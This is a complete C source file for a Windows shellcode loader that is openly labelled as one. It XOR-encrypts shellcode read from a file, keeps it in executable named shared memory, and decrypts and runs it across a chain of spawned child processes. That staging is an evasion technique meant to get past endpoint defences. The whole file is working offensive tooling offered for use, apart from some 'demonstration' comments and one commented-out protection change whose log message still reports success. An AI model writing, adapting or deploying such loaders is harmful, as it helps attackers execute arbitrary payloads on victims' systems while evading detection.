#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Disable specific warnings for Visual Studio
#ifdef _MSC_VER
#pragma warning(disable: 4996)  // Disable deprecated function warnings
#pragma warning(disable: 4244)  // Disable conversion warnings
#pragma warning(disable: 4267)  // Disable size_t conversion warnings
#endif

// XOR key for decryption (multibyte)
#define XOR_KEY "\x13\x37\xde\xad\xbe\xef"
#define XOR_KEY_LEN 6
#define SHARED_MEM_SIZE 8192

// Shared memory structure for inter-process communication
typedef struct {
    volatile DWORD stage;
    volatile DWORD shellcode_size;
    volatile LPVOID exec_mem;
    volatile BYTE shellcode[4096];
} SharedData;

// Global variables for shared memory
HANDLE g_shared_mem_handle = NULL;
SharedData* g_shared_data = NULL;
HANDLE g_stage_handle = NULL;
DWORD* g_stage_ptr = NULL;

// Function prototypes
void stage1_allocate_and_read(void);
void stage2_decrypt(void);
void stage3_make_executable(void);
void stage4_execute(void);
void create_child_process(int stage);
void decrypt_shellcode(BYTE* data, DWORD size);
void read_shellcode_from_file(void);
BOOL init_shared_memory(void);
void cleanup_shared_memory(void);
BOOL open_existing_shared_memory(void);

int main(int argc, char* argv[]) {
    printf("[+] Shellcode Loader - Multi-stage with Process Isolation\n");
    
    // Determine which stage we're in based on command line arguments
    int stage = 0;
    if (argc > 1) {
        stage = atoi(argv[1]);
    }
    
    printf("[+] Current stage: %d\n", stage);
    
    switch (stage) {
        case 0:
            printf("[+] Stage 0: Initial process - Reading shellcode\n");
            if (!init_shared_memory()) {
                printf("[-] Failed to initialize shared memory\n");
                return 1;
            }
            
            printf("[+] Stage 1: Allocating RW memory\n");
            stage1_allocate_and_read();
            read_shellcode_from_file();
            create_child_process(2);
            break;
            
        case 2:
            printf("[+] Stage 2: Decrypting shellcode\n");
            if (!open_existing_shared_memory()) {
                printf("[-] Failed to open existing shared memory\n");
                return 1;
            }
            stage2_decrypt();
            create_child_process(3);
            break;
            
        case 3:
            printf("[+] Stage 3: Making memory executable (RX)\n");
            if (!open_existing_shared_memory()) {
                printf("[-] Failed to open existing shared memory\n");
                return 1;
            }
            stage3_make_executable();
            printf("[+] Stage 4: Executing shellcode\n");
            stage4_execute();
            break;
            
        default:
            printf("[-] Invalid stage: %d\n", stage);
            cleanup_shared_memory();
            return 1;
    }
    
    cleanup_shared_memory();
    return 0;
}

void read_shellcode_from_file(void) {
    FILE* file = fopen("shellcode.bin", "rb");
    if (!file) {
        printf("[-] Failed to open shellcode.bin\n");
        return;
    }
    
    // Get file size
    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    if (size > sizeof(g_shared_data->shellcode)) {
        printf("[-] Shellcode too large\n");
        fclose(file);
        return;
    }
    
    // Read and encrypt the shellcode for demonstration
    BYTE* temp_buffer = malloc(size);
    fread(temp_buffer, 1, size, file);
    fclose(file);
    
    // Encrypt with XOR for demonstration
    for (int i = 0; i < size; i++) {
        temp_buffer[i] ^= XOR_KEY[i % XOR_KEY_LEN];
    }
    
    // Copy to shared memory
    memcpy((void*)g_shared_data->shellcode, temp_buffer, size);
    g_shared_data->shellcode_size = size;
    
    printf("[+] Read and encrypted %d bytes of shellcode\n", (int)size);
    free(temp_buffer);
}

void stage1_allocate_and_read(void) {
    printf("[+] Allocating RW shared memory for shellcode\n");
    
    if (!g_shared_data) {
        printf("[-] Shared memory not initialized\n");
        return;
    }
    
    // The shellcode is already in shared memory from stage 0
    // Mark this stage as complete
    g_shared_data->stage = 1;
    printf("[+] Stage 1 complete - Shared memory allocated as RW\n");
    printf("[+] Shared memory address: %p\n", g_shared_data);
    printf("[+] Shellcode size in shared memory: %d bytes\n", g_shared_data->shellcode_size);
}

void stage2_decrypt(void) {
    printf("[+] Decrypting shellcode with multibyte XOR\n");
    
    if (!g_shared_data || g_shared_data->shellcode_size == 0) {
        printf("[-] No shellcode to decrypt\n");
        return;
    }
    
    // Decrypt the shellcode in shared memory
    decrypt_shellcode((BYTE*)g_shared_data->shellcode, g_shared_data->shellcode_size);
    
    g_shared_data->stage = 2;
    printf("[+] Stage 2 complete - Shellcode decrypted\n");
}

void stage3_make_executable(void) {
    printf("[+] Changing memory protection to RX\n");
    
    if (!g_shared_data || g_shared_data->shellcode_size == 0) {
        printf("[-] No shellcode to make executable\n");
        return;
    }
    
    // Change memory protection to executable
    /*DWORD old_protect;
    if (!VirtualProtect((LPVOID)g_shared_data->shellcode, g_shared_data->shellcode_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
        printf("[-] Failed to change memory protection: %d\n", GetLastError());
        return;
    }*/
    
    // Store the executable memory pointer in shared memory
    g_shared_data->exec_mem = (LPVOID)g_shared_data->shellcode;
    g_shared_data->stage = 3;
    
    printf("[+] Stage 3 complete - Memory is now executable at address: %p\n", g_shared_data->shellcode);
}

void stage4_execute(void) {
    printf("[+] Executing shellcode\n");
    
    if (!g_shared_data || g_shared_data->shellcode_size == 0) {
        printf("[-] No shellcode to execute\n");
        return;
    }
    
    if (g_shared_data->exec_mem == NULL) {
        printf("[-] No executable memory allocated from previous stage\n");
        return;
    }
    
    printf("[+] Using executable memory from stage 3 at address: %p\n", g_shared_data->exec_mem);
    printf("[+] Jumping to shellcode\n");
    
    // Execute shellcode using the memory allocated in stage 3
    __try {
        ((void(*)())g_shared_data->exec_mem)();
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] Exception occurred during shellcode execution\n");
    }
    
    printf("[+] Stage 4 complete - Shellcode executed\n");
}

void create_child_process(int stage) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    char cmdline[512];
    char modified_cmdline[512];
    
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
    
    // Get current command line and remove the last argument
    LPSTR original_cmdline = GetCommandLineA();
    strcpy_s(modified_cmdline, sizeof(modified_cmdline), original_cmdline);
    
    // Find and remove the last argument (last space and everything after it)
    char* last_space = strrchr(modified_cmdline, ' ');
    if (last_space != NULL) {
        *last_space = '\0';  // Terminate string at the last space
    }
    
    // Now append the new stage number
    _snprintf_s(cmdline, sizeof(cmdline), _TRUNCATE, "%s %d", modified_cmdline, stage);
    
    printf("[+] Creating child process for stage %d\n", stage);
    printf("[+] Command line: %s\n", cmdline);
    
    // Create child process with handle inheritance
    if (!CreateProcessA(
        NULL,           // Application name
        cmdline,        // Command line
        NULL,           // Process security attributes
        NULL,           // Thread security attributes
        TRUE,           // Inherit handles
        0,              // Creation flags
        NULL,           // Environment
        NULL,           // Current directory
        &si,            // Startup info
        &pi             // Process information
    )) {
        printf("[-] Failed to create child process: %d\n", GetLastError());
        return;
    }
    
    printf("[+] Child process created with PID: %d\n", pi.dwProcessId);
    
    // Wait for child process to complete
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    DWORD exit_code;
    GetExitCodeProcess(pi.hProcess, &exit_code);
    printf("[+] Child process exited with code: %d\n", exit_code);
    
    // Close handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void decrypt_shellcode(BYTE* data, DWORD size) {
    printf("[+] Decrypting %d bytes with key: ", (int)size);
    for (int i = 0; i < XOR_KEY_LEN; i++) {
        printf("%02x ", (unsigned char)XOR_KEY[i]);
    }
    printf("\n");
    
    // XOR decrypt with multibyte key
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= XOR_KEY[i % XOR_KEY_LEN];
    }
    
    printf("[+] Decryption complete\n");
}

BOOL init_shared_memory(void) {
    printf("[+] Initializing shared memory\n");
    
    // Create shared memory for the main data structure
    g_shared_mem_handle = CreateFileMappingA(
        INVALID_HANDLE_VALUE,    // Use paging file
        NULL,                    // Default security
        PAGE_EXECUTE_READWRITE,   // Read/write access
        0,                       // Maximum object size (high-order DWORD)
        SHARED_MEM_SIZE,         // Maximum object size (low-order DWORD)
        "ShellcodeLoaderData"    // Name of mapping object
    );
    
    if (g_shared_mem_handle == NULL) {
        printf("[-] Failed to create shared memory mapping: %d\n", GetLastError());
        return FALSE;
    }
    
    // Map the shared memory into this process's address space
    g_shared_data = (SharedData*)MapViewOfFile(
        g_shared_mem_handle,     // Handle to map object
        FILE_MAP_ALL_ACCESS,     // Read/write permission
        0,                       // High-order 32 bits of offset
        0,                       // Low-order 32 bits of offset
        sizeof(SharedData)       // Number of bytes to map
    );
    
    if (g_shared_data == NULL) {
        printf("[-] Failed to map view of shared memory: %d\n", GetLastError());
        CloseHandle(g_shared_mem_handle);
        g_shared_mem_handle = NULL;
        return FALSE;
    }
    
    // Initialize the shared data structure
    memset((void*)g_shared_data, 0, sizeof(SharedData));
    
    printf("[+] Shared memory initialized at address: %p\n", g_shared_data);
    return TRUE;
}

BOOL open_existing_shared_memory(void) {
    printf("[+] Opening existing shared memory\n");
    
    // Open existing shared memory
    g_shared_mem_handle = OpenFileMappingA(
        FILE_MAP_ALL_ACCESS,     // Read/write access
        FALSE,                   // Do not inherit the name
        "ShellcodeLoaderData"    // Name of mapping object
    );
    
    if (g_shared_mem_handle == NULL) {
        printf("[-] Failed to open shared memory mapping: %d\n", GetLastError());
        return FALSE;
    }
    
    // Map the shared memory into this process's address space
    g_shared_data = (SharedData*)MapViewOfFile(
        g_shared_mem_handle,     // Handle to map object
        FILE_MAP_ALL_ACCESS,     // Read/write permission
        0,                       // High-order 32 bits of offset
        0,                       // Low-order 32 bits of offset
        sizeof(SharedData)       // Number of bytes to map
    );
    
    if (g_shared_data == NULL) {
        printf("[-] Failed to map view of shared memory: %d\n", GetLastError());
        CloseHandle(g_shared_mem_handle);
        g_shared_mem_handle = NULL;
        return FALSE;
    }
    
    printf("[+] Shared memory opened at address: %p\n", g_shared_data);
    return TRUE;
}

void cleanup_shared_memory(void) {
    printf("[+] Cleaning up shared memory\n");
    
    if (g_shared_data != NULL) {
        UnmapViewOfFile(g_shared_data);
        g_shared_data = NULL;
    }
    
    if (g_shared_mem_handle != NULL) {
        CloseHandle(g_shared_mem_handle);
        g_shared_mem_handle = NULL;
    }
    
    printf("[+] Shared memory cleanup complete\n");
}